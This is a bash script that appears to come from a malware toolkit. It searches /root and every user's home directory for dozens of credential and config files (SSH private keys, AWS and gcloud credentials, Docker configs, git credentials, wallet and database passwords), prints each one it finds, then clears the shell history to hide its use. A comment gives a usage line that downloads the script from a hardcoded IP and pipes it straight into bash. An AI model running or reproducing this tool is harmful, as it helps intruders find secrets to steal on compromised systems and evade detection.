#!/bin/bash

# looking for this data / app config:
#
# SSH, AWS, Docker, s3cfg, GitHub, Shodan, gcloud,
# Ngrok, Pidgin, FileZilla, HexChat, MoneroGuiWallet,
# CloudFlared, davfs2, PostgreSQL, smbClients
#
# wget -O - http://45.9.148.35/chimaera/sh/search.sh |bash
#
clear; echo "";echo "";echo "scan for files and data of interest: ";echo "";echo ""

FULL_ARRAY=("/etc/passwd-s3fs" "/etc/davfs2/secrets" "/etc/zypp/credentials.d/NCCcredentials" "/etc/cloudflared/config.yml" "/etc/eksctl/metadata.env")

PATH_ARRAY=(".ssh/id_rsa" ".ssh/id_rsa.pub" ".ssh/known_hosts" ".ssh/config" ".ssh/authorized_keys" ".ssh/authorized_keys2" \
			".aws/config" ".aws/credentials" ".aws/credentials.gpg" ".docker/config.json" ".docker/ca.pem" ".s3backer_passwd" "s3proxy.conf" \
			".s3ql/authinfo2" ".passwd-s3fs" ".s3cfg" ".git-credentials" ".gitconfig" ".shodan/api_key" ".ngrok2/ngrok.yml" ".purple/accounts.xml" \
            ".config/filezilla/filezilla.xml" ".config/filezilla/recentservers.xml" ".config/hexchat/servlist.conf" ".config/monero-project/monero-core.conf" \
            ".boto" ".netrc" ".config/gcloud/access_tokens.db" ".config/gcloud/credentials.db" ".davfs2/secrets" ".pgpass" ".local/share/jupyter/runtime/notebook_cookie_secret" \
            ".smbclient.conf" ".smbcredentials" ".samba_credentials")
                      
	for CHECK_PATH in ${PATH_ARRAY[@]}; do 
	if [ "$(whoami)" = "root" ];then 
	if [ -f "/root/$CHECK_PATH" ];then echo -e "\e[1;33;41m FOUND: /root/$CHECK_PATH \033[0m";fi
	fi
for USER_AXX in $(ls -1 /home/); do 
if [ -f "/home/$USER_AXX/$CHECK_PATH" ];then echo -e "\e[1;33;41m FOUND: /home/$USER_AXX/$CHECK_PATH \033[0m";fi
done
	done

echo "";echo "";echo "done!";echo "";echo ""
history -c
sleep 3
clear
